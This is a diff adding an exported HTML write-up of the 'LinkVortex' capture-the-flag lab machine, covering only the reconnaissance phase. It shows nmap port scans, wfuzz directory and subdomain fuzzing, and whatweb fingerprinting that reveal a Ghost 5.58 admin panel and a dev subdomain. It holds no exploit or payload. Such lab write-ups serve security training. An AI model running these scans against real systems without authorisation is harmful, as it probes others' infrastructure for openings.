@@ -1,0 +1,1186 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>LinkVortex - 10.10.11.47</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="16fd1b9f-8847-80cd-8a83-f70e5d72f125" class="page sans"><header><h1 class="page-title">LinkVortex - 10.10.11.47</h1><p class="page-description"></p></header><div class="page-body"><h1 id="19020991-fb41-473d-9925-df0c7a6dc30a" class="">Information Gathering &amp; Enumeration</h1><p id="d7dc1b91-7f80-48f6-8e98-46833e619d67" class="">
+</p><h2 id="982883ff-6c0d-4dba-b4ca-8642a7d3de6c" class="">Web</h2><figure id="16fd1b9f-8847-800f-905d-c8d164fae9fd" class="image"><a href="../img/Linkvortex/image.png"><img style="width:707.96875px" src="../img/Linkvortex/image.png"/></a></figure><figure id="16fd1b9f-8847-8052-a4bb-f90f059b5c34" class="image"><a href="../img/Linkvortex/image 1.png"><img style="width:707.96875px" src="../img/Linkvortex/image 1.png"/></a></figure><figure id="16fd1b9f-8847-80eb-8465-ed98e2f08997" class="image"><a href="../img/Linkvortex/image 2.png"><img style="width:708px" src="../img/Linkvortex/image 2.png"/></a></figure><h2 id="d06d84eb-825e-4a11-8984-5695715fc489" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d4acab9-4ebe-43bb-8c8d-45f3713c3e5d" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ sudo nmap -sS -p- --min-rate=5000 -T5 -n 10.10.11.47
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 20:05 -05
+Warning: 10.10.11.47 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.11.47
+Host is up (0.10s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds</code></pre><p id="c1fdee50-8f34-403c-990c-166503a9467c" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3eddae0e-a2f3-4dcf-bcbb-fcd4e834ed43" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ nmap -sVC -T5 -n linkvortex.htb -p22,80
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 20:09 -05
+Nmap scan report for linkvortex.htb (10.10.11.47)
+Host is up (0.10s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
+|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
+80/tcp open  http    Apache httpd
+|_http-generator: Ghost 5.58
+|http-server-header: Apache
+| http-robots.txt: 4 disallowed entries
+|/ghost/ /p/ /email/ /r/
+|_http-title: BitByBit Hardware
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
+
+                                                                </code></pre><p id="c8855775-73bb-4994-bd17-4b4f8db279d0" class="">
+</p><h2 id="fb13aa8c-8ba1-4e66-b561-fe4c5374cba5" class="">Directory Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a5a73cb5-aa84-49f0-a4db-04def98cdc51" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">                                                                                                                     
+┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://linkvortex.htb/FUZZ -t 50 --hc 301 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://linkvortex.htb/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000004227:   403        7 L      20 W       199 Ch      &quot;server-status&quot;                                     
+000004255:   200        307 L    914 W      12148 Ch    &quot;http://linkvortex.htb/&quot;                            
+000004494:   200        22 L     167 W      1065 Ch     &quot;LICENSE&quot;                                           
+
+ /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 3: URL rejected: Malformed input to a URL function
+Total time: 177.9150
+Processed Requests: 29949
+Filtered Requests: 29946
+Requests/sec.: 168.3331
+
+</code></pre><h2 id="712f2699-27fa-4a46-9eea-0ce46822be37" class="">DNS Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b3d3010e-c3a7-4bc2-8cff-a0f5520053b8" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u &quot;http://linkvortex.htb/&quot; -H &quot;Host:FUZZ.linkvortex.htb&quot; -t 50 --sc 200 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://linkvortex.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000019:   200        115 L    255 W      2538 Ch     &quot;dev&quot;                                               
+
+Total time: 0
+Processed Requests: 19966
+Filtered Requests: 19965
+Requests/sec.: 0
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="54030a1a-e676-4929-a5ab-9baa35bb41ef" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u &quot;http://linkvortex.htb/&quot; -H &quot;Host:FUZZ.linkvortex.htb&quot; -t 50 --sc 200
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://linkvortex.htb/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000022:   200        115 L    255 W      2538 Ch     &quot;dev&quot;                                               
+
+Total time: 0
+Processed Requests: 100000
+Filtered Requests: 99999
+Requests/sec.: 0
+
+</code></pre><p id="6621a47d-25cb-4799-84da-b805a94508cf" class="">
+</p><h2 id="172a9e24-e75b-4598-993e-776b8fd5dd1a" class="">Web Tech enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a8b08ec1-aef1-4d6b-8960-ee4ace9d80c5" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ whatweb &quot;http://linkvortex.htb/&quot; -a 3 
+http://linkvortex.htb/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge]
+</code></pre><figure id="16fd1b9f-8847-807f-915e-d3ca2052f575" class="image"><a href="../img/Linkvortex/image 3.png"><img style="width:707.96875px" src="../img/Linkvortex/image 3.png"/></a></figure><p id="16fd1b9f-8847-80b1-9ea3-e28409ef3d29" class="">
+</p><h2 id="4f07056c-c6b0-4bd7-8e92-7bf9a236fa34" class="">Findings</h2><ul id="d4750733-985d-459f-b176-c4fbb320e91b" class="bulleted-list"><li style="list-style-type:disc">/ghost → admin panel</li></ul><figure id="16fd1b9f-8847-80a0-b1c6-d02119de366a" class="image"><a href="../img/Linkvortex/image 4.png"><img style="width:707.96875px" src="../img/Linkvortex/image 4.png"/></a></figure><ul id="16fd1b9f-8847-8018-a67a-f7d6013e4fa1" class="bulleted-list"><li style="list-style-type:disc">dev.linkvortex.htb</li></ul><p id="16fd1b9f-8847-80fe-8ade-c2fd9b493b27" class="">
+</p><p id="5401b48f-fc04-4dcf-9e88-c346e513d7b0" class="">
+</p><p id="8b0d8c6f-01f9-4c4b-8b60-667e6df3d134" class="">
+</p><p id="3d754798-e24b-413d-9afa-48f9f69cbdf7" class="">
